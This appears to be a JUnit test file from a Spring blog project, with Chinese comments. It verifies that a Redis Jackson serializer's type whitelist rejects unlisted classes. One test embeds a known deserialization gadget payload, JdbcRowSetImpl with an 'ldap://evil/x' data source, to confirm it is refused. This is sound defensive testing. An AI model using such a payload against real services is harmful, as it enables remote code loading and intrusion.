package com.ryu.blog.config;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;

import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Redis 值序列化的多态类型白名单测试
 *
 * <p>背景：Redis 的值类型是 {@code Object}，所以必须开 default typing
 * 才能把 {@code HashMap}、实体对象原样读回来。而 default typing 意味着
 * JSON 里带类名 —— 类名不受限制的话，<b>能往 Redis 写值的人就能让应用
 * 实例化任意类</b>（Jackson 反序列化 gadget 链的入口）。
 *
 * <p>这个测试把「白名单生效」固化成断言：
 * <ol>
 *   <li>白名单内的类型照常往返；</li>
 *   <li>白名单外的类型名被拒绝。</li>
 * </ol>
 */
class RedisConfigPolymorphicTypeTest {

    /**
     * 构造一个和线上一样的序列化器
     */
    private Jackson2JsonRedisSerializer<Object> serializer() {
        ObjectMapper base = new ObjectMapper();
        base.registerModule(new JavaTimeModule());
        return new Jackson2JsonRedisSerializer<>(RedisConfig.buildRedisObjectMapper(base), Object.class);
    }

    @Test
    @DisplayName("白名单内的类型能正常往返")
    void allowedTypesRoundTrip() {
        Jackson2JsonRedisSerializer<Object> serializer = serializer();

        Map<String, Object> value = new LinkedHashMap<>();
        value.put("fileId", 42L);
        value.put("filePath", "/tmp/a.txt");
        value.put("expireTime", java.time.LocalDateTime.of(2026, 1, 1, 0, 0));

        byte[] bytes = serializer.serialize(value);
        Object restored = serializer.deserialize(bytes);

        assertTrue(restored instanceof Map, "应当还原成 Map，实际是 " + restored.getClass());
        assertEquals(value.get("fileId"), ((Map<?, ?>) restored).get("fileId"));
        assertEquals(value.get("filePath"), ((Map<?, ?>) restored).get("filePath"));
        assertEquals(value.get("expireTime"), ((Map<?, ?>) restored).get("expireTime"));
    }

    @Test
    @DisplayName("白名单外的类名被拒绝（多态反序列化不能变成任意类实例化入口）")
    void disallowedTypeIsRejected() {
        Jackson2JsonRedisSerializer<Object> serializer = serializer();

        // WRAPPER_ARRAY 格式：[类名, 值]
        // 这个类名不在白名单里 —— 攻击者往 Redis 里塞这样的值，
        // 应用必须拒绝，而不是去实例化它。
        byte[] poisoned = ("[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://evil/x\"}]")
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);

        assertThrows(Exception.class, () -> serializer.deserialize(poisoned),
                "白名单外的类名必须被拒绝");
    }

    @Test
    @DisplayName("JDK 容器类型在白名单内")
    void jdkContainersAreAllowed() {
        Jackson2JsonRedisSerializer<Object> serializer = serializer();

        Map<String, Object> value = new HashMap<>();
        value.put("k", "v");

        byte[] bytes = serializer.serialize(value);
        Object restored = serializer.deserialize(bytes);

        assertTrue(restored instanceof Map);
    }
}
